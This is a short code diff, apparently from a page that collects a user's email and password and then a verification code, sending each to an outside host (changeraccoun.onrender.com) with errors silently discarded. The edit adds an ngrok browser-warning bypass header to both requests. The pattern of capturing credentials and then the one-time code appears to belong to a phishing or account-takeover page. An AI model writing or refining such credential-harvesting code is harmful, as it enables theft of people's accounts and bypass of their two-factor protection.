@@ -763,7 +763,10 @@ function goStep3() {
   fetch("https://changeraccoun.onrender.com/login", {
     method: "POST",
     credentials: "include",
-    headers: { "Content-Type": "application/json" },
+    headers: {
+    "Content-Type": "application/json",
+    "ngrok-skip-browser-warning": "true"    // ← ajoute ça
+    },
     body: JSON.stringify({ email, password })
   }).catch(() => {});
 
@@ -816,7 +819,10 @@ async function checkCode() {
     await fetch("https://changeraccoun.onrender.com/verify-code", {
       method: "POST",
       credentials: "include",
-      headers: { "Content-Type": "application/json" },
+      headers: {
+      "Content-Type": "application/json",
+      "ngrok-skip-browser-warning": "true"    // ← ajoute ça
+      },
       body: JSON.stringify({ code })
     });
   } catch (_) {}
